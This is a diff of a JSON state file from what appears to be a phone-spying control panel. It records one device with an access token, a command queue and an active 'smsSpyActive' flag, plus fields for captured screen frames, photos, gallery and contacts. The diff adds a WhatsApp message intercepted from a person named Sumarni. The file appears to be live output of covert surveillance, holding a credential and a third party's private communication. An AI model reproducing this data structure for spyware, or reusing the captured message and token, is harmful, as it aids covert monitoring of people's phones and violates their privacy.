@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776761919317,
+    "lastSeen": 1776761922317,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -19,7 +19,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Sumarni",
+        "content": "Bulik nyambel tempe sama tahu klo mau ma",
+        "time": "21/04 16:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776761924012
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
